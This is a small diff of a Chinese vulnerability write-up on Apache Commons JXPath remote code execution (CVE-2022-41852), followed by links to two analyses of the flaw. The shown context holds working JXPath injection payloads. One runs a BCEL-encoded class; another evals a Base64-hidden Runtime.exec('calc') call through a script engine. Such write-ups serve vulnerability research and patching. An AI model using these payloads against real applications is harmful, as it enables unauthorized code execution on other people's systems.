@@ -280,15 +280,13 @@ newInstance(loadClass(com.sun.org.apache.bcel.internal.util.ClassLoader.new(),BC
 runMain(com.sun.org.apache.bcel.internal.util.JavaWrapper.new(),BCEL_Code,'')
 ```
 
-
-
 其他一些想法：
 
 ```java
 eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'), java.lang.String.new(decode(java.util.Base64.getDecoder(), "amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNhbGMiKQ==")))
 ```
 
-## Reference
+# Reference
 
 * [浅析Apache Commons Jxpath命令执行分析(CVE-2022-41852) | Y4tacker's Blog](https://y4tacker.github.io/2022/10/13/year/2022/10/浅析Apache-Commons-Jxpath命令执行分析-CVE-2022-41852/)
 * [CVE-2022-41852 Apache Commons Jxpath 命令执行漏洞分析 (seebug.org)](https://paper.seebug.org/1992/)
